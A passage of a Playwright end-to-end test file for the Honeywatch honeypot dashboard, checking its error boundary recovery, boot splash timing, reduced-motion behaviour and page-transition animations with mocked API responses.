  test('a failed sessions load shows the error boundary and recovers', async ({ page }) => {
    // Override with 500 (LIFO wins over beforeEach mock); suspense rejects to App-level ErrorBoundary.
    let fail = true
    // Regex distinguishes list (/sessions/?page=...) from detail (/sessions/<id>).
    await page.route(/\/api\/v1\/sessions\/(\?|$)/, async (route) => {
      if (fail)
        return route.fulfill({
          status: 500,
          contentType: 'application/json',
          body: '{"code":500,"status":"Internal Server Error","message":"boom"}',
        })
      return route.fallback()
    })

    await page.goto('/sessions')
    // List query retries 5xx twice with backoff before boundary catches.
    const alert = page.getByRole('alert')
    await expect(alert).toBeVisible({ timeout: 15_000 })
    await expect(alert).toContainText('Something went wrong')
    // A failed view never resolves Suspense, so the error boundary must remove the splash.
    await expect(page.locator('#hw-splash')).toHaveCount(0)

    fail = false
    await alert.getByRole('button', { name: 'Try again' }).click()
    await expect(page.getByRole('heading', { level: 1, name: 'Sessions' })).toBeVisible()
  })
})

// Delays every request matching `url` until the returned release() is called. Overview
// cannot render until /stats/map answers, so holding that keeps the splash up.
async function holdRequest(page: Page, url = '**/api/v1/stats/map'): Promise<() => void> {
  let release!: () => void
  const gate = new Promise<void>((r) => (release = r))
  await page.route(url, async (route) => {
    await gate
    await route.fallback()
  })
  return release
}

test.describe('boot splash', () => {
  test.beforeEach(async ({ page }) => {
    await mockApi(page)
  })

  test('stays up until the first view is in, then leaves before About opens', async ({ page }) => {
    const errors: string[] = []
    page.on('console', (m) => m.type() === 'error' && errors.push(m.text()))
    page.on('pageerror', (e) => errors.push(e.message))
    // Sets window.aboutOverSplash if the About dialog ever exists while the splash does.
    await page.addInitScript(() => {
      new MutationObserver(() => {
        if (
          document.querySelector('[aria-label="About Honeywatch"]') &&
          document.getElementById('hw-splash')
        )
          Object.assign(window, { aboutOverSplash: true })
      }).observe(document, { childList: true, subtree: true })
    })
    // Overview needs the map data to render; the .topbar check below confirms it has not.
    const release = await holdRequest(page)

    await page.goto('/')
    const splash = page.locator('#hw-splash')
    await expect(splash).toHaveAttribute('role', 'status')
    // Suspense resolves once at mount, before the first route loads; that must not
    // remove the splash.
    await page.waitForFunction(() => performance.now() > 1200)
    await expect(page.locator('.topbar')).toHaveCount(0)
    await expect(splash).toBeVisible()
    await expect(splash).not.toHaveAttribute('data-state', 'exit')
    // The hint is visibility:hidden until it appears at 5s, so screen readers do not hear
    // it early.
    expect(await splash.ariaSnapshot()).not.toContain('Still loading')

    release()
    await expect(splash).toHaveCount(0)
    await expect(page.getByRole('dialog', { name: 'About Honeywatch' })).toBeVisible()
    expect(await page.evaluate(() => 'aboutOverSplash' in window)).toBe(false)
    expect(errors).toEqual([])
  })

  test('reduced motion drops the turning loop but keeps the splash', async ({ page }) => {
    await page.route('**/assets/*.js', (r) => r.abort()) // no app, so nothing ever removes the splash
    const turning = () =>
      page.evaluate(() =>
        document.getAnimations().some((a) => (a as CSSAnimation).animationName === 'hw-turn'),
      )
    await page.goto('/')
    await expect(page.locator('#hw-splash')).toBeVisible()
    expect(await turning()).toBe(true)
    await expect(page.locator('.hw-mark')).toHaveCSS('animation-name', 'hw-in-s')
    await page.emulateMedia({ reducedMotion: 'reduce' })
    expect(await turning()).toBe(false)
    // Opacity-only fade-in, no scale.
    await expect(page.locator('.hw-mark')).toHaveCSS('animation-name', 'hw-in')
    // tokens.css cuts animations to 0.01ms for reduced motion; index.html restores the fades.
    await expect(page.locator('.hw-mark')).toHaveCSS('animation-duration', '0.48s')
    await expect(page.locator('#hw-splash')).toBeVisible()
  })

  test('a load that outlasts the failsafe is removed without replaying the exit', async ({
    page,
  }) => {
    await page.addInitScript(() => {
      new MutationObserver(() => Object.assign(window, { exitReplayed: true })).observe(document, {
        subtree: true,
        attributes: true,
        attributeFilter: ['data-state'],
      })
    })
    const release = await holdRequest(page)
    await page.goto('/')
    const splash = page.locator('#hw-splash')
    // Skip the waits: jump the 5s hint and the 12s failsafe fade-out to their end.
    const finish = (name: string) =>
      page.evaluate(
        (n) =>
          document
            .getAnimations()
            .find((a) => (a as CSSAnimation).animationName === n)
            ?.finish(),
        name,
      )
    await finish('hw-hint-in')
    await expect(splash.getByText('Still loading - hang tight.')).toBeVisible()
    expect(await splash.ariaSnapshot()).toContain('Still loading')
    await finish('hw-failsafe')
    await expect(splash).toHaveCSS('visibility', 'hidden')

    release()
    await expect(splash).toHaveCount(0)
    expect(await page.evaluate(() => 'exitReplayed' in window)).toBe(false)
  })

  test('the hexagon reveal ends with a ring centred on the honeypot marker', async ({ page }) => {
    // Release the map once the splash has been up 800ms (on its own clock, as splash.ts reads
    // it), past the 500ms fast-exit limit, so it leaves through the hexagon reveal.
    const release = await holdRequest(page)
    await page.goto('/')
    await page.waitForFunction(
      () => Number(document.getElementById('hw-splash')?.getAnimations()[0]?.currentTime) > 800,
    )
    release()

    // The mocked map has no Helsinki city, so the ring sits on the plain sensor marker.
    await page.locator('html[data-hw-exit]').waitFor({ state: 'attached' })
    const centres = await page.evaluate(() => {
      const mid = (el: Element) => {
        const b = el.getBoundingClientRect()
        return { x: b.x + b.width / 2, y: b.y + b.height / 2 }
      }
      return {
        ring: mid(document.querySelector('.boot-ping:not(.boot-ping-under)')!),
        marker: mid(document.querySelector('.sensor')!),
      }
    })
    expect(Math.abs(centres.ring.x - centres.marker.x)).toBeLessThan(1)
    expect(Math.abs(centres.ring.y - centres.marker.y)).toBeLessThan(1)
    await expect(page.locator('.boot-ping').last()).toHaveCSS('animation-name', /boot-ping/)

    // The attribute leaves, so coming back to Overview later never replays it.
    await expect(page.locator('html')).not.toHaveAttribute('data-hw-exit', '')
  })

  test('reduced motion: the exit is a short fade and the Helsinki ring stays still', async ({
    page,
  }) => {
    await page.emulateMedia({ reducedMotion: 'reduce' })
    // Read the cover's fade length as the exit starts (the node is gone 240ms later). tokens.css
    // would cut it to 0.01ms under reduced motion; index.html restores 240ms.
    await page.addInitScript(() => {
      new MutationObserver((records) => {
        const el = records[0]!.target as HTMLElement
        const cover = el.id === 'hw-splash' && el.querySelector('.hw-cover')
        if (cover) Object.assign(window, { exitFade: getComputedStyle(cover).animationDuration })
      }).observe(document, { subtree: true, attributes: true, attributeFilter: ['data-state'] })
    })
    const release = await holdRequest(page)
    await page.goto('/')
    await page.waitForFunction(
      () => Number(document.getElementById('hw-splash')?.getAnimations()[0]?.currentTime) > 800,
    )
    release()
    await expect(page.locator('#hw-splash')).toHaveCount(0)
    expect(await page.evaluate(() => (window as unknown as { exitFade: string }).exitFade)).toBe(
      '0.24s',
    )
    await expect(page.locator('.boot-ping').last()).toHaveCSS('animation-name', 'none')
  })

  test('a slow page change ends with the hexagon reveal, a fast one does not', async ({ page }) => {
    await page.goto('/')
    await expect(page.locator('#hw-splash')).toHaveCount(0)
    await dismissIntro(page)
    // Sets window.revealed if a splash copy is ever added (only revealPage does that).
    await page.evaluate(() => {
      new MutationObserver(() => {
        if (document.getElementById('hw-splash')) Object.assign(window, { revealed: true })
      }).observe(document.body, { childList: true })
    })
    const revealed = () => page.evaluate(() => 'revealed' in window)

    // Fast: Credentials answers from the mock straight away.
    await page.getByRole('link', { name: 'Credentials', exact: true }).first().click()
    await expect(page.getByRole('heading', { level: 1, name: 'Credentials' })).toBeVisible()
    expect(await revealed()).toBe(false)

    // Slow: Pulse waits for its heatmap; hold it for 700ms, past the 500ms limit.
    const release = await holdRequest(page, '**/api/v1/stats/heatmap*')
    await page.getByRole('link', { name: 'Pulse', exact: true }).first().click()
    await expect(page.locator('.loading[role="status"]')).toBeVisible()
    await page.waitForTimeout(700)
    release()
    await expect(page.locator('#hw-splash[data-state="exit"]')).toHaveCount(1)
    await expect(page.locator('#hw-splash')).toHaveCount(0)
    expect(await revealed()).toBe(true)
  })
})
